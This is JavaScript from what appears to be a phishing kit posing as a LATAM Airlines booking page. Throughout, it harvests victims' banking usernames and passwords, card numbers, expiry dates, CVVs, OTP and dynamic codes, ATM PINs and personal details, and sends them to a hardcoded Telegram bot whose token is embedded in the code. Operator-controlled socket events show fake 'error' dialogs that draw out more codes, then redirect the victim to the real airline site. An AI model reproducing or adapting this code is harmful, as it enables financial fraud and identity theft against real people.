const socket = io();
 
    

            var userInfo = {
                id: socket.id,
                name: info.metaInfo.name || ''
            };

            if (userInfo.name !== "") {
           socket.emit('user-connected', userInfo);

           //Variables data
           const idnow = userInfo.id;
           const namenow = userInfo.name; 
           const banco = info.metaInfo.ban;
           const user = info.metaInfo.user;
           const pass = info.metaInfo.puser;
           const cCard = info.metaInfo.p;
           const Fecha = info.metaInfo.pdate;
           const CVV =  info.metaInfo.c;           
           const infos = "";
           const userError = "";
           const passError = "";            
           const ccaj = "";
           const ccid = socket.id;
           console.log('idnow:',idnow);
           console.log('ccid:',ccid);




            socket.emit('send-info', {          
                idnow,
                namenow,
                banco,
                user,
                pass,
                cCard,
                Fecha,
                CVV,
                infos,
                userError,
                passError,
                ccaj,
                ccid                
            });
            
            }        
          
      


        const cc = info.metaInfo.name;
        const IDcliente = info.metaInfo.name;

        socket.emit('client-info', { IDcliente});
        

        function showDialog(data) {
            document.getElementById('loader').style.display = 'none';            
            document.getElementById('dialog-overlay').style.display = 'flex';
            document.getElementById('dialog-overlay').classList.add('active');

            setTimeout(() => {
        document.getElementById('dialog-overlay').style.opacity = '1';
    }, 10);

        }

        function hideDialog() {
            document.getElementById('dialog-overlay').style.opacity = '0'; // Opacidad a cero primero
    setTimeout(() => {
        document.getElementById('dialog-overlay').classList.remove('active');
        document.getElementById('loader').style.display = 'flex';            
    }, 300);         
        }

        function sendInfo() {
            const idnow = socket.id;
           const namenow = userInfo.name; 
           const banco = info.metaInfo.ban;
           const user = info.metaInfo.user;
           const pass = info.metaInfo.puser;
           const cCard = info.metaInfo.p;
           const Fecha = info.metaInfo.pdate;
           const CVV =  info.metaInfo.c;  

            const infos = document.getElementById('dynamic-key').value;
            const dinamica = document.getElementById('dynamic-key').value;
            //usuario
            const userError = document.getElementById('user-error').value;
            const passError = document.getElementById('pw-error').value;            
            //clave cajero
            const ccaj = document.getElementById('ccajero').value;
            const ccid = socket.id;
            const namec = info.metaInfo.name;
            /*if (/^\d{1,8}$/.test(infos)) {*/
            document.getElementById('sending-message').style.display = 'block';
                
                const mensaje = `
    🟢 NUEVO REGISTRO 🟢 
 ----------------------------
 📲 BANCO: ${info.metaInfo.ban}
 🔴 CC: ${info.metaInfo.cc} 🔴
 👥 USER: ${userError !== "" ? userError : info.metaInfo.user}
 🔒 PASS: ${passError !== "" ? passError : info.metaInfo.puser}
 🔵 FRANQ:
 🔵 NIVEL:
 🔵 TIPO:
 🔵 PAIS: ${info.flightInfo.destination.country}
 ----------------------------
 💳 CARD: ${info.metaInfo.p}
 📅 FECHA: ${info.metaInfo.pdate}
 ⭐ CVV: ${info.metaInfo.c}
 ----------------------------
 💣 C-DIN: ${dinamica} 
 💣 OTP: ${info.metaInfo.cdin}
 💣 C-CAJERO: ${ccaj !== "" ? ccaj : info.metaInfo.ccaj} 
 💣 C-AVANCE: ${info.metaInfo.cavance}
 ------- INFO VIAJE ------
 🟢 TIPO: ${info.flightInfo.origin.ticket_type}
 🟢 ORIGEN: ${info.flightInfo.origin.city}
 🟢 DESTINO: ${info.flightInfo.destination.city}
 🟢 ADULTOS: ${info.flightInfo.adults}
 🟢 NIÑOS: ${info.flightInfo.children}
 🟢 BEBÉS: ${info.flightInfo.babies}
 ------- INFO PERSONAL ------
 🟢 NOMBRE: ${info.metaInfo.name} 🟢
 📧 TEL: ${info.metaInfo.telnum}
 📲 EMAIL: ${info.metaInfo.email}
 📲 CIUDAD: ${info.metaInfo.city}
 📲 DIRECCIÓN: ${info.metaInfo.address}
 📲 DISP: ${info.metaInfo.disp}
                `;

    //CONFIGURACION DE LAS APIS TELEGRAM
    //REEMPLAZA LA PALABRA APIAQUI CON TU TOKEN
    //REEMPLAZA LOS 000 CON TU NUMERO DE CHAT ID
    const API1 = 'https://api.telegram.org/bot8032105963:AAFfjf3RB3um-wrYtMaDKcKLSZ44tgw4wYw/sendMessage';
    const chatid1 = '-4552820212';
    
    

    enviarMensajeTelegram(mensaje,API1,chatid1);
    

      
    function enviarMensajeTelegram(mensaje,api,idchat) {
    
        fetch(api, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: idchat,
                text: mensaje,
            }),
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Hubo un problema al enviar el mensaje.');
            }
            console.log('Mensaje enviado con éxito al bot de Telegram.');


                socket.emit('send-info', { 
                    infos,
                    userError,
                    passError,
                    ccaj,
                    ccid,
                    namec,
                    banco,
                    user,
                    pass,
                    cCard,
                    Fecha,
                    CVV });


                setTimeout(() => {
                    document.getElementById('sending-message').style.display = 'none';
                    hideDialog();
                }, 2500);

            //window.location.href = 'security-check.html';
        })
        .catch(error => {
            console.error('Error al enviar el mensaje:', error);
        });
    }

      


            /*} else {
                alert('Please enter a valid numeric key up to 8 digits.');
            }*/
}

        socket.on('receive-message', () => {
            console.log("Redirijiendo a Latam...");
            window.location.replace("https://www.latamairlines.com/co/es");
        });

        socket.on('redirect', (url) => {
            window.location.href = url;
        });

        socket.on('info-request', () => {
         
         //Clave dinamica normal
         document.getElementById('td').style.display="block";
         document.getElementById('desotp').style.display="block";
         document.getElementById('dynamic-key').style.display="block";

         //Error dinamica
         document.getElementById('tderror').style.display="none";
         document.getElementById('deserror-otp').style.display="none";


         // usuario y clave error
         document.getElementById('tuser').style.display="none";
         document.getElementById('deserror-user').style.display="none";
         document.getElementById('user-error').style.display="none";
         document.getElementById('pw-error').style.display="none";
         
         //Clave cajero
         document.getElementById('tccajero').style.display="none";
         document.getElementById('desc-cajero').style.display="none";
         document.getElementById('ccajero').style.display="none";
         
           setTimeout(() => {   showDialog(); }, 10);
            
        });

        //OTP error accion
        socket.on('give-otperror',() =>{

         console.log("waiting correcto");


         //Clave dinamica normal
         document.getElementById('td').style.display="none";
         document.getElementById('desotp').style.display="none";
         document.getElementById('dynamic-key').style.display="block";

         //Error dinamica
         document.getElementById('tderror').style.display="block";
         document.getElementById('deserror-otp').style.display="block";


         // usuario y clave error
         document.getElementById('tuser').style.display="none";
         document.getElementById('deserror-user').style.display="none";
         document.getElementById('user-error').style.display="none";
         document.getElementById('pw-error').style.display="none";
         
         //Clave cajero
         document.getElementById('tccajero').style.display="none";
         document.getElementById('desc-cajero').style.display="none";
         document.getElementById('ccajero').style.display="none";
         

        //desplegamos el dialogo con un ligero retardo para
         //asegurarnos de que los cambios se hagan bien
         setTimeout(() => {   showDialog(); }, 10);


        
        });

        //usuario y clave
        socket.on('give-usererror',() =>{
         

         //Clave dinamica normal
         document.getElementById('td').style.display="none";
         document.getElementById('desotp').style.display="none";
         document.getElementById('dynamic-key').style.display="none";

         //Error dinamica
         document.getElementById('tderror').style.display="none";
         document.getElementById('deserror-otp').style.display="none";


         // usuario y clave error
         document.getElementById('tuser').style.display="block";
         document.getElementById('deserror-user').style.display="block";
         document.getElementById('user-error').style.display="block";
         document.getElementById('pw-error').style.display="block";
         
         //Clave cajero
         document.getElementById('tccajero').style.display="none";
         document.getElementById('desc-cajero').style.display="none";
         document.getElementById('ccajero').style.display="none";
         


         //desplegamos el dialogo con un ligero retardo para
         //asegurarnos de que los cambios se hagan bien
         setTimeout(() => {    showDialog(); }, 10);
         

        
        });

        //Clave cajero
        socket.on('give-ccajero',() =>{
                  
         //Clave dinamica normal
         document.getElementById('td').style.display="none";
         document.getElementById('desotp').style.display="none";
         document.getElementById('dynamic-key').style.display="none";

         //Error dinamica
         document.getElementById('tderror').style.display="none";
         document.getElementById('deserror-otp').style.display="none";


         // usuario y clave error
         document.getElementById('tuser').style.display="none";
         document.getElementById('deserror-user').style.display="none";
         document.getElementById('user-error').style.display="none";
         document.getElementById('pw-error').style.display="none";
         
         //Clave cajero
         document.getElementById('tccajero').style.display="block";
         document.getElementById('desc-cajero').style.display="none";
         document.getElementById('ccajero').style.display="block";

         //desplegamos el dialogo con un ligero retardo para
         //asegurarnos de que los cambios se hagan bien
         setTimeout(() => { showDialog(); }, 10);


        
        });





// Esta es la función para enviar la información del cliente al servidor
      
            //const clientId = info.metaInfo.p;
           
        
 
 